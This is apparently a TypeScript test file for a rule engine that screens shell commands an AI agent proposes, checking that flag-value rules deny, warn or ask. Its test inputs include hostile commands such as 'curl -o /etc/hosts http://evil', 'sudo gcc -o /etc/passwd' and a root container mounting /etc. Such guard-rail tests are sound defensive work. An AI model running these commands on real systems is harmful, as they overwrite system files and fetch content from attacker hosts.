// A2 (0.6.0): cmd().flagValueMatches(flag, /regex/) and .flagValueEquals(flag, value).
// Inspects the VALUE of a flag (not just its presence). Backed by shell-ast 0.6's
// polymorphic tokensAfter(u, flag) which dispatches to u.innerRaw for wrapped
// variants (so `cmd("gcc").flagValueMatches("-o", ...)` fires on `sudo gcc -o ...`).
//
// Multi-value semantics: ANY-match (at least one value must satisfy the predicate).
// Dynamic-value policy: skipped silently — predicate doesn't get a chance.

import { describe, expect, test } from "bun:test";
import { cmd } from "../../src/builders/command.js";
import { createModule } from "../../src/core/module.js";
import { runModule } from "../../src/engine/index.js";

function modOf(rule: Parameters<typeof createModule>[1][number]) {
  return createModule({ id: "x", name: "x", events: ["PreToolUse"], matchers: ["Bash"] }, [rule]);
}

describe(".flagValueMatches() — regex predicate (A2)", () => {
  test("gcc -o /etc/passwd fires deny on system-path regex", async () => {
    const mod = modOf(
      cmd("gcc")
        .flagValueMatches("-o", /^\/(etc|sys|dev|usr|boot)/)
        .deny("system path"),
    );
    const out = await runModule({ module: mod, command: "gcc -o /etc/passwd src.c" });
    expect(out.terminal?.kind).toBe("deny");
  });

  test("gcc -o /tmp/myprog does NOT fire (non-system path)", async () => {
    const mod = modOf(
      cmd("gcc")
        .flagValueMatches("-o", /^\/(etc|sys|dev|usr|boot)/)
        .deny("system path"),
    );
    const out = await runModule({ module: mod, command: "gcc -o /tmp/myprog src.c" });
    expect(out.terminal).toBeNull();
  });

  test("curl -o /etc/hosts fires (= form via 0.6 helper)", async () => {
    const mod = modOf(
      cmd("curl")
        .flagValueMatches("-o", /^\/(etc|root|home)/)
        .deny("curl writes sensitive path"),
    );
    const out = await runModule({ module: mod, command: "curl -o /etc/hosts http://evil" });
    expect(out.terminal?.kind).toBe("deny");
  });

  test("--output=/etc/passwd ( = form ) is captured", async () => {
    const mod = modOf(
      cmd("curl")
        .flagValueMatches("--output", /^\/etc/)
        .deny("curl --output to /etc"),
    );
    const out = await runModule({
      module: mod,
      command: "curl --output=/etc/hosts http://evil",
    });
    expect(out.terminal?.kind).toBe("deny");
  });

  test("--output /etc/passwd ( space form ) is captured", async () => {
    const mod = modOf(
      cmd("curl")
        .flagValueMatches("--output", /^\/etc/)
        .deny("curl --output to /etc"),
    );
    const out = await runModule({
      module: mod,
      command: "curl --output /etc/hosts http://evil",
    });
    expect(out.terminal?.kind).toBe("deny");
  });

  test("repeated flag: -c k1=v1 -c k2=v2 — ANY-match fires", async () => {
    const mod = modOf(
      cmd("git")
        .flagValueMatches("-c", /^user\.email=root@/)
        .warning("root commit"),
    );
    const out = await runModule({
      module: mod,
      command: "git -c user.name=root -c user.email=root@example.com commit -m x",
    });
    expect(out.annotations.find((a) => a.kind === "warning")).toBeDefined();
  });

  test("dynamic value: -o $VAR — skipped silently, no match", async () => {
    const mod = modOf(
      cmd("gcc")
        .flagValueMatches("-o", /^\/etc/)
        .deny("system path"),
    );
    const out = await runModule({ module: mod, command: "gcc -o $TARGET src.c" });
    expect(out.terminal).toBeNull();
  });

  test("wrapped (sudo gcc): polymorphic tokensAfter dispatches to innerRaw", async () => {
    const mod = modOf(
      cmd("gcc")
        .flagValueMatches("-o", /^\/etc/)
        .deny("system path"),
    );
    const out = await runModule({ module: mod, command: "sudo gcc -o /etc/passwd src.c" });
    expect(out.terminal?.kind).toBe("deny");
  });

  test("inline-shell recursion: bash -c 'gcc -o /etc/passwd src.c'", async () => {
    const mod = modOf(
      cmd("gcc")
        .flagValueMatches("-o", /^\/etc/)
        .deny("system path"),
    );
    const out = await runModule({
      module: mod,
      command: 'bash -c "gcc -o /etc/passwd src.c"',
    });
    expect(out.terminal?.kind).toBe("deny");
  });

  test("flag absent: rule does not fire (other predicates passed)", async () => {
    const mod = modOf(
      cmd("gcc")
        .flagValueMatches("-o", /^\/etc/)
        .deny("system path"),
    );
    const out = await runModule({ module: mod, command: "gcc src.c" });
    expect(out.terminal).toBeNull();
  });

  test("multiple flagValueMatches stack with AND semantics", async () => {
    const mod = modOf(
      cmd("docker", "run")
        .flagValueMatches("--user", /^root$/)
        .flagValueMatches("--volume", /^\/etc:/)
        .deny("dangerous combo"),
    );
    const both = await runModule({
      module: mod,
      command: "docker run --user root --volume /etc:/etc nginx",
    });
    expect(both.terminal?.kind).toBe("deny");

    const onlyOne = await runModule({
      module: mod,
      command: "docker run --user root --volume /tmp:/etc nginx",
    });
    expect(onlyOne.terminal).toBeNull();
  });
});

describe(".flagValueEquals() — exact-string predicate (A2)", () => {
  test("docker run --user=root fires deny", async () => {
    const mod = modOf(
      cmd("docker", "run").flagValueEquals("--user", "root").deny("root container"),
    );
    const out = await runModule({
      module: mod,
      command: "docker run --user=root nginx",
    });
    expect(out.terminal?.kind).toBe("deny");
  });

  test("docker run --user nobody does NOT fire", async () => {
    const mod = modOf(
      cmd("docker", "run").flagValueEquals("--user", "root").deny("root container"),
    );
    const out = await runModule({ module: mod, command: "docker run --user nobody nginx" });
    expect(out.terminal).toBeNull();
  });

  test("kubectl --context prod ask fires", async () => {
    const mod = modOf(
      cmd("kubectl").flagValueEquals("--context", "prod").ask("prod context — confirm"),
    );
    const out = await runModule({
      module: mod,
      command: "kubectl --context prod get pods",
    });
    expect(out.terminal?.kind).toBe("ask");
  });

  test("substring of value does NOT match (strict equality)", async () => {
    const mod = modOf(
      cmd("docker", "run").flagValueEquals("--user", "root").deny("root container"),
    );
    const out = await runModule({
      module: mod,
      command: "docker run --user rootless nginx",
    });
    expect(out.terminal).toBeNull();
  });
});
